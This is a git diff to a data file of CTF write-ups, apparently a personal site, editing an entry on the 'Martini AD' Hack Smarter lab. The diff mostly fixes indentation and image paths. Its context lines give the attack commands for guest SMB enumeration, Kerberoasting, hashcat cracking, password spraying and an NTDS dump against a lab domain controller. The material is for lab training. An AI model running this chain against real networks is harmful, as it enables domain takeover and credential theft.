@@ -868,16 +868,16 @@ dismay\\administrator
 },
 
 {
-   id: "martini-ad",
-   title: "Martini AD (Hack Smarter Labs)",
-   ctf: "Hack Smarter Labs",
-   cat: "Active Directory",
-   diff: "Easy",
-   pts: 0,
-   date: "2026-10-24",
-   summary: "An internal black-box Active Directory assessment that moves from guest SMB enumeration to domain compromise through exposed notes, Kerberoasting, credential reuse and DCSync.",
-   files: [],
-   body: `![Martini AD preview](assets/writeups/martiniAD/preview.png)
+  id: "martini-ad",
+  title: "Martini AD (Hack Smarter Labs)",
+  ctf: "Hack Smarter Labs",
+  cat: "Active Directory",
+  diff: "Easy",
+  pts: 0,
+  date: "2026-10-24",
+  summary: "An internal black-box Active Directory assessment that moves from guest SMB enumeration to domain compromise through exposed notes, Kerberoasting, credential reuse and DCSync.",
+  files: [],
+  body: `![Martini AD preview](assets/writeups/martiniAD/preview.png)
 
 ## Scope / Objective
 
@@ -891,7 +891,7 @@ The initial scan identified the target at \`10.1.253.173\` and exposed a typical
 nmap -sCV 10.1.253.173 -vv
 \`\`\`
 
-![Nmap enumeration](assets/writeups/BitStream/image.png)
+![Nmap enumeration](assets/writeups/martiniAD/nmap.png)
 
 ## SMB Enumeration
 
@@ -902,9 +902,9 @@ nxc smb 10.1.253.173 -u '' -p '' --shares
 nxc smb 10.1.253.173 -u guest -p '' --shares
 \`\`\`
 
-![SMB null authentication check](assets/writeups/BitStream/image.png)
+![SMB null authentication check](assets/writeups/martiniAD/nxc(null).png)
 
-![SMB share enumeration](assets/writeups/BitStream/image.png)
+![SMB share enumeration](assets/writeups/martiniAD/smb(share).png)
 
 ### Notes Share
 
@@ -914,7 +914,9 @@ The \`Notes\` share was accessible through the guest account. Reviewing its cont
 smbclient //10.1.253.173/notes -U guest
 \`\`\`
 
-![Notes share contents](assets/writeups/BitStream/image.png)
+![Notes share contents](assets/writeups/martiniAD/note(share).png)
+
+![Additional notes screenshot](assets/writeups/martiniAD/note(share2).png)
 
 ## Initial Access
 
@@ -923,6 +925,8 @@ The notes contained credentials for the account \`mprice\`. I used them to enume
 \`\`\`text
 mprice : [REDACTED]
 \`\`\`
+
+![Recovered credentials from notes](assets/writeups/martiniAD/creds(note).png)
 
 ### Username Enumeration
 
@@ -937,7 +941,7 @@ The enumeration identified the following principals:
 - \`ATHENA_SVC\`
 - \`DC01$\`
 
-![RID brute-force user enumeration](assets/writeups/BitStream/image.png)
+![RID brute-force user enumeration](assets/writeups/martiniAD/user(enum).png)
 
 ## Kerberoasting
 
@@ -947,7 +951,7 @@ I checked for accounts with Service Principal Names (SPNs) and requested the rel
 impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'[REDACTED]' -request -dc-ip 10.1.253.173
 \`\`\`
 
-![Kerberoastable account enumeration](assets/writeups/BitStream/image.png)
+![Kerberoastable account enumeration](assets/writeups/martiniAD/kerber.png)
 
 ### Password Cracking
 
@@ -961,7 +965,7 @@ hashcat hash.txt /usr/share/wordlists/rockyou.txt
 ATHENA_SVC : [REDACTED]
 \`\`\`
 
-![Hashcat result](assets/writeups/BitStream/image.png)
+![Hashcat result](assets/writeups/martiniAD/hashcrack.png)
 
 ## BloodHound Analysis
 
@@ -971,7 +975,7 @@ With the \`ATHENA_SVC\` account compromised, I collected and reviewed Active Dir
 bloodyad --host "10.1.253.173" -d "DRY.MARTINI.BARS" -u ATHENA_SVC -p '[REDACTED]' get bloodhound
 \`\`\`
 
-![BloodHound analysis](assets/writeups/BitStream/image.png)
+![BloodHound analysis](assets/writeups/martiniAD/bloodhoundanalysis.png)
 
 ## Password Reuse
 
@@ -983,7 +987,7 @@ nxc ldap 10.1.253.173 -u users.txt -p '[REDACTED]' --continue-on-success
 
 The account \`athena.t0\` was successfully authenticated.
 
-![LDAP password-spray results](assets/writeups/BitStream/image.png)
+![LDAP password-spray results](assets/writeups/martiniAD/passspray.png)
 
 ## Domain Compromise
 
@@ -992,8 +996,8 @@ With the \`athena.t0\` account compromised, I used the account's privileges to o
 \`\`\`bash
 nxc smb 10.1.253.173 -u athena.t0 -p '[REDACTED]' --ntds
 \`\`\`
-
-![DCSync results](assets/writeups/BitStream/image.png)
+![DCSync results](assets/writeups/martiniAD/psexec.png)
+![DCSync results](assets/writeups/martiniAD/dcsync.png)
 
 ## Key Findings
 
